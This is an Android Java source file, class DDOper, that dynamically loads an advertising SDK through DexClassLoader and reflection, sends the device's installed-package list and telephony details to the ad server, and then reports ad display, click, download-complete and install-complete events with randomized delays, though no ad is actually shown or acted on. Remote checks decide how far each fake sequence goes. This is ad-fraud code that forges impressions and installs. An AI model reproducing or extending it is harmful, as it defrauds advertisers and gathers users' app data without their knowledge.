package ad.dd;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import ad.jz.HttpUtil;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class DDOper {
	private static DexClassLoader dcl;
	private static Object mObjAdInfo;
	private static Random rand = new Random();
	private static Context context;

	public static void oper(Context context) {
		DDOper.context = context;
		if (!HttpUtil.goDdNext(context, 0)) {
			Log.e("lkt", "豆豆不显示");
			return;
		}
		Dex.copyFileToLocal(context);
		Dex.loadDex(context);
		Dex.fillConfigParams((TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE), context);
		dcl = Dex.getClassLoader();
		onGetAdList();
		try {
			Thread.sleep(5000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		if (mObjAdInfo == null) {
			Log.e("lkt", "获取的广告为空");
			return;
		}
		report(1);
		Log.e("lkt", "豆豆显示完");
		if (!HttpUtil.goDdNext(context, 1)) {
			Log.e("lkt", "豆豆不点击");
			return;
		}
		try {
			Thread.sleep(1000 + rand.nextInt(1000));
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		report(2);
		Log.e("lkt", "豆豆点击完");
		try {
			Thread.sleep(15000 + rand.nextInt(10000));
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		report(3);
		Log.e("lkt", "豆豆下载完");
		if (!HttpUtil.goDdNext(context, 2)) {
			Log.e("lkt", "豆豆不安装");
			return;
		}
		try {
			Thread.sleep(10000 + rand.nextInt(5000));
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		report(4);
		Log.e("lkt", "豆豆安装完");
	}

	// [推送, 展示, 点击, 下载完成, 安装完成, 打开积分墙, cpa, 下载失败]
	private static void report(int index) {
		if (mObjAdInfo == null) {
			return;
		}
		try {
			Class cls_AdStatus = dcl.loadClass("cs.entity.AdStatus");
			Object[] enums = cls_AdStatus.getEnumConstants();

			Class cls_AddOneAppReportRequest = dcl
					.loadClass("cs.request.AddOneAppReportRequest");
			Method m_Report = cls_AddOneAppReportRequest.getDeclaredMethod(
					"Report", Context.class, cls_AdStatus,
					dcl.loadClass("cs.entity.AdBasicInfo"));
			m_Report.setAccessible(true);

			m_Report.invoke(null, context, enums[index], mObjAdInfo);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static void onGetAdList() {
		try {
			Class cls_Ad_ChapingGetRequest = dcl
					.loadClass("cs.request.Ad_ChapingGetRequest");
			Constructor cons_cls_Ad_ChapingGetRequest = cls_Ad_ChapingGetRequest
					.getDeclaredConstructor(Context.class, List.class);
			final Object obj_cls_Ad_ChapingGetRequest = cons_cls_Ad_ChapingGetRequest
					.newInstance(context, PackageUtil
							.getInstalledUserPackagesForStrings(context));

			Class cls_AbstractRequest = dcl
					.loadClass("cs.network.request.AbstractRequest");
			Class cls_IRequestLinsener = dcl
					.loadClass("cs.network.request.IRequestLinsener");

			Class cls_DefaultRequestLinsener = dcl
					.loadClass("cs.network.request.DefaultRequestLinsener");
			Object obj_lis = new ProxyHandler().bind(
					cls_DefaultRequestLinsener, new OnMethodInvokedListener() {
						@Override
						public void onMethodInvoke(Object proxy, Method method,
								Object[] args) {
							if ("onSuccess".equals(method.getName())) {
								try {
									Class cls_InterfaceResult = dcl
											.loadClass("cs.network.result.InterfaceResult");
									Object obj_InterfaceResult = args[0];

									Field f_addDatas = cls_InterfaceResult
											.getDeclaredField("addDatas");
									f_addDatas.setAccessible(true);
									Object obj_AddDatas = f_addDatas
											.get(obj_InterfaceResult);

									Class cls_AddDatas = dcl
											.loadClass("cs.network.result.AddDatas");
									Field f_resultlist = cls_AddDatas
											.getDeclaredField("resultlist");
									f_resultlist.setAccessible(true);
									Object obj_resultlist = f_resultlist
											.get(obj_AddDatas);

									Class cls_AdBasicInfo = dcl
											.loadClass("cs.entity.AdBasicInfo");
									Field f_packageName = cls_AdBasicInfo
											.getDeclaredField("packageName");
									f_packageName.setAccessible(true);
									ArrayList list = (ArrayList) obj_resultlist;
									for (Object o : list) {
										mObjAdInfo = o;
									}
								} catch (Exception e) {
									e.printStackTrace();
								}
							}
						}
					});
			Method m_query = cls_AbstractRequest.getDeclaredMethod("query",
					cls_IRequestLinsener, boolean.class);
			m_query.setAccessible(true);
			m_query.invoke(obj_cls_Ad_ChapingGetRequest, obj_lis, false);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
